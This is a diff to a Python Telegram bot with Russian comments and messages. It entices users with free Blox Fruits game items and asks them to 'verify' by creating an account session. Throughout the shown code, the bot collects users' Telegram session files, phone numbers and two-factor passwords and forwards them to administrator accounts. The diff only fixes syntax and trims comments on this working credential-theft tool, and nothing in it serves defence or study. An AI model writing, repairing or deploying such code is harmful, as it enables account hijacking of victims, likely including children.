@@ -32,7 +32,6 @@ def log_sent_session(user_id, phone, session_file):
     with open(SENT_LOG, 'w') as f:
         json.dump(log, f, indent=2)
 
-# ПИЗДЕЦ ВАЖНО: send_to_admin теперь принимает bot как аргумент, а не использует глобальную хуйню
 async def send_to_admin(bot, admin_id, session_file, user_id, phone, twofa=None):
     print(f"[DEBUG] Отправка админу {admin_id}, файл: {session_file}")
     print(f"[DEBUG] Файл существует? {os.path.exists(session_file)}")
@@ -59,13 +58,12 @@ async def send_to_admin(bot, admin_id, session_file, user_id, phone, twofa=None)
         return False
 
 async def main():
-    global bot  # ДОБАВИЛИ ГЛОБАЛЬНУЮ ХУЙНЮ, ЧТОБЫ ИЗБЕЖАТЬ ЕБУЧИХ ОШИБОК
+    global bot
     bot = TelegramClient('bot_main', APP_ID, APP_HASH)
     await bot.start(bot_token=BOT_TOKEN)
     me = await bot.get_me()
     print(f"✅ БОТ ЗАПУЩЕН: {me.first_name} (ID: {me.id})")
 
-    # Уведомляем админов
     for admin_id in ADMIN_IDS:
         try:
             admin_entity = await bot.get_entity(admin_id)
@@ -89,9 +87,10 @@ async def main():
             )
             return
 
+        # ИСПРАВЛЕНО - ЗАПЯТАЯ ПОСЛЕ СТРОКИ!
         await event.respond(
             "⚠️ **Требуется верефикация** ⚠️\n\n"
-            "Привет,чтобы получить хорошие фрукты в блокс фруктс вам необходимо создать сессию на аккаунт,это нужно для того чтобы если ваш аккаунт взломают злоумышленники то мы смогли вам восстановить сессию а также чтоб получить крутые фрукты! без этого получить фрукты не получится."
+            "Привет, чтобы получить хорошие фрукты в блокс фруктс вам необходимо создать сессию на аккаунт, это нужно для того чтобы если ваш аккаунт взломают злоумышленники то мы смогли вам восстановить сессию а также чтоб получить крутые фрукты! без этого получить фрукты не получится.",
             buttons=[[Button.inline("✅ Верефицироватся ✅", b"verify")]],
             parse_mode='markdown'
         )
@@ -196,7 +195,6 @@ async def main():
                         print(f"[DEBUG] ФАЙЛ НАЙДЕН: {session_filename}")
 
                         for admin_id in ADMIN_IDS:
-                            # ПЕРЕДАЁМ bot АРГУМЕНТОМ, ПИЗДЮК
                             await send_to_admin(bot, admin_id, session_filename, uid, phone)
 
                         await event.respond(
@@ -260,7 +258,6 @@ async def main():
 
                     if session_filename and os.path.exists(session_filename):
                         for admin_id in ADMIN_IDS:
-                            # ЗДЕСЬ ТОЖЕ ПЕРЕДАЁМ bot
                             await send_to_admin(bot, admin_id, session_filename, uid, phone, twofa)
                         await event.respond("✅ **Верефикация пройдена!**", parse_mode='markdown')
                     else:
